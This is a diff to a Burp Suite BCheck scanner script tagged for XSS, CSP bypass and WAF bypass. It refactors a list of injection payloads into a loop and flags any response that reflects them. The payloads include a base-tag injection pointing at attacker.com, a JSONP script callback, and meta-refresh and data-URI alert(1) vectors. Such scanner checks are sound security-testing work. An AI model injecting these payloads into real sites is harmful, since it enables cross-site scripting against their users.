@@ -5,17 +5,18 @@ metadata:
     author: "BCheck Arsenal"
     tags: "xss", "csp-bypass", "waf-bypass"
 
+run for each:
+    payload = "<base href='https://attacker.com/'>",
+        "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>",
+        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
+        "<object data='data:text/html,<script>alert(1)</script>'>",
+        "<link rel=import href='data:text/html,<script>alert(1)</script>'>"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "<base href='https://attacker.com/'>"
-            - "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>"
-            - "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
-            - "<object data='data:text/html,<script>alert(1)</script>'>"
-            - "<link rel=import href='data:text/html,<script>alert(1)</script>'>"
+        replacing: {payload}
 
-    if {check.response} matches "(<base href|<meta http-equiv|<object data|<link rel)" then
+    if {latest.response} matches "(<base href|<meta http-equiv|<object data|<link rel)" then
         report issue:
             severity: high
             confidence: tentative
